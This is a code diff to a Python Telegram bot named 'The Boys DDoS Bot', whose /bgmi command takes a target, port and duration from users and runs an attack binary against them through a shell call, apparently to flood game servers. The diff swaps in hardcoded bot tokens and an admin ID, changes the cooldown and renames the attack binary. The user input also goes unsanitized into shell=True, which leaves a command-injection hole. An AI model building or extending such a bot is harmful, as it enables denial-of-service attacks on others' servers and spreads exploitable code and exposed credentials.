@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7774369692:AAGmwq2k62L9h8Sae9P5PToyu7sYXc07s9I')
+bot = telebot.TeleBot('7675494292:AAHIn8nvXwPD2Mbroq13Rd9qwJoml3ks27Y')
 
 # Admin user IDs
-admin_id = {"7941184624"}
+admin_id = {"5666606072"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -210,7 +210,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =3
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -221,7 +221,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown . Please Wait 3 sec Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -238,7 +238,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soulcracks {target} {port} {time}"
+                full_command = f"./tom {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
@@ -296,8 +296,8 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''👋🏻Welcome to Your Home, {user_name}! Feel Free to Explore.
-🤖Try To Run This Command : /help 
+    response = f'''👋🏻Welcome to The Boys DDoS Bot, {user_name}!\nFeel Free to Explore.
+\n🤖Try To Run This Command : /help 
 '''
     bot.reply_to(message, response)
 
